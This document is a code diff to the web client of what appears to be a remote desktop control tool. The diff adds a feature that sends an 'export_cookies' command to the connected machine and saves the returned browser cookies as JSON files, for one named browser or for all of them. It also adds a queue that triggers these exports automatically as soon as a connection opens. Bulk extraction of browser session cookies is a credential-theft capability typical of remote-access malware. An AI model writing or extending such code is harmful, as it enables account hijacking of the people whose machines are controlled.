@@ -131,6 +131,8 @@
     storageDrawer: document.getElementById("storageDrawer"),
     appStatus: document.getElementById("appStatus"),
     appButtons: Array.from(document.querySelectorAll("[data-app]")),
+    cookieStatus: document.getElementById("cookieStatus"),
+    cookieButtons: Array.from(document.querySelectorAll("[data-cookie]")),
     remotePathInput: document.getElementById("remotePathInput"),
     remoteFileList: document.getElementById("remoteFileList"),
     remoteStatus: document.getElementById("remoteStatus"),
@@ -338,6 +340,14 @@
     dom.appStatus.dataset.state = stateKey;
   }
 
+  function setCookieStatus(message, stateKey = "") {
+    if (!dom.cookieStatus) {
+      return;
+    }
+    dom.cookieStatus.textContent = message;
+    dom.cookieStatus.dataset.state = stateKey;
+  }
+
   function updateAppLaunchAvailability() {
     const enabled = state.isConnected && state.controlEnabled;
     dom.appButtons.forEach((button) => {
@@ -351,6 +361,25 @@
       }
     } else {
       setAppStatus("Ready", "");
+    }
+  }
+
+  function updateCookieAvailability() {
+    const enabled = state.isConnected && state.controlEnabled;
+    dom.cookieButtons.forEach((button) => {
+      button.disabled = !enabled;
+    });
+    if (!dom.cookieStatus) {
+      return;
+    }
+    if (!enabled) {
+      if (!state.isConnected) {
+        setCookieStatus("Connect to export cookies", "warn");
+      } else {
+        setCookieStatus("Switch to manage mode to export cookies", "warn");
+      }
+    } else {
+      setCookieStatus("Ready", "");
     }
   }
 
@@ -373,6 +402,7 @@
       stopStatsMonitor();
     }
     updateAppLaunchAvailability();
+    updateCookieAvailability();
     updateCursorOverlayVisibility();
   }
 
@@ -403,6 +433,7 @@
     document.body.classList.toggle("manage-mode", state.controlEnabled);
     document.body.classList.toggle("view-mode", !state.controlEnabled);
     updateAppLaunchAvailability();
+    updateCookieAvailability();
     const disableManage = !state.controlEnabled;
     dom.manageOnly.forEach((section) => {
       section.classList.toggle("disabled", disableManage);
@@ -1331,6 +1362,7 @@
         applyStreamProfile(state.streamProfile, true);
         scheduleStreamHint();
         startStatsMonitor();
+        drainCookieQueue();
         if (state.storageAutostart && !dom.storageDrawer.classList.contains("open")) {
           toggleStorage(true);
         }
@@ -1563,7 +1595,8 @@
     }
     state.pendingDownload = {
       path,
-      name: getBaseName(path)
+      name: getBaseName(path),
+      kind: "file"
     };
     setDownloadStatus(`Downloading ${state.pendingDownload.name}`, "warn");
     try {
@@ -1577,6 +1610,74 @@
       state.pendingDownload = null;
     }
   }
+
+  function normalizeCookieList(browsers) {
+    if (!browsers) {
+      return [];
+    }
+    const list = Array.isArray(browsers) ? browsers : [browsers];
+    const cleaned = list
+      .map((item) => String(item || "").trim().toLowerCase())
+      .filter(Boolean);
+    return Array.from(new Set(cleaned));
+  }
+
+  function buildCookieFilename(browsers) {
+    const label = browsers.length ? browsers.join("_") : "all";
+    const stamp = new Date().toISOString().replace(/[:.]/g, "").slice(0, 15);
+    return `cookies_${label}_${stamp}.json`;
+  }
+
+  async function requestCookieExport(browsers, filenameOverride) {
+    if (!ensureChannelOpen()) {
+      setCookieStatus("Data channel not ready", "warn");
+      return;
+    }
+    const normalized = normalizeCookieList(browsers);
+    const label = normalized.length ? normalized.join(", ") : "all";
+    const filename = filenameOverride || buildCookieFilename(normalized);
+    state.pendingDownload = {
+      name: filename,
+      kind: "cookies"
+    };
+    setCookieStatus(`Exporting cookies (${label})`, "warn");
+    setDownloadStatus(`Exporting cookies (${label})`, "warn");
+    try {
+      const payload = { action: "export_cookies" };
+      if (normalized.length) {
+        payload.browsers = normalized;
+      }
+      const message = await encodeOutgoing(payload);
+      state.controlChannel.send(message);
+    } catch (error) {
+      setCookieStatus(`E2EE error: ${error.message}`, "bad");
+      state.pendingDownload = null;
+    }
+  }
+
+  function drainCookieQueue() {
+    if (!state.isConnected) {
+      return;
+    }
+    const queue = window.__remdeskCookieQueue;
+    if (!Array.isArray(queue) || queue.length === 0) {
+      return;
+    }
+    window.__remdeskCookieQueue = [];
+    queue.forEach((entry) => {
+      if (Array.isArray(entry)) {
+        void requestCookieExport(entry);
+        return;
+      }
+      if (entry && typeof entry === "object") {
+        void requestCookieExport(entry.browsers || [], entry.filename || null);
+      }
+    });
+  }
+
+  window.remdeskDownloadCookies = (browsers, filename) => {
+    void requestCookieExport(browsers, filename);
+  };
 
   async function requestAppLaunch(appName) {
     if (!ensureChannelOpen()) {
@@ -1726,11 +1827,14 @@
       return;
     }
     if (state.pendingDownload) {
+      if (state.pendingDownload.kind === "cookies") {
+        setCookieStatus(message, "bad");
+      }
       setDownloadStatus(message, "bad");
       state.pendingDownload = null;
-    } else {
-      setRemoteStatus(message, "bad");
+      return;
     }
+    setRemoteStatus(message, "bad");
   }
 
   function handleAppLaunchStatus(payload) {
@@ -1755,6 +1859,9 @@
         setAppStatus(reason, "bad");
         state.pendingAppLaunch = null;
       } else if (state.pendingDownload) {
+        if (state.pendingDownload.kind === "cookies") {
+          setCookieStatus(reason, "bad");
+        }
         setDownloadStatus(reason, "bad");
         state.pendingDownload = null;
       } else {
@@ -1797,12 +1904,19 @@
       setDownloadStatus("Unexpected download payload", "warn");
       return;
     }
+    const isCookieDownload = state.pendingDownload.kind === "cookies";
     try {
       saveBase64File(message, state.pendingDownload.name);
       addDownloadEntry(state.pendingDownload.name);
       setDownloadStatus(`Saved ${state.pendingDownload.name}`, "ok");
+      if (isCookieDownload) {
+        setCookieStatus(`Saved ${state.pendingDownload.name}`, "ok");
+      }
     } catch (error) {
       setDownloadStatus("Failed to save file", "bad");
+      if (isCookieDownload) {
+        setCookieStatus("Failed to save file", "bad");
+      }
     } finally {
       state.pendingDownload = null;
     }
@@ -1853,6 +1967,16 @@
         if (appName) {
           void requestAppLaunch(appName);
         }
+      });
+    });
+    dom.cookieButtons.forEach((button) => {
+      button.addEventListener("click", () => {
+        const browser = button.dataset.cookie;
+        if (!browser) {
+          return;
+        }
+        const list = browser === "all" ? [] : [browser];
+        void requestCookieExport(list);
       });
     });
     dom.connectButton.addEventListener("click", () => {
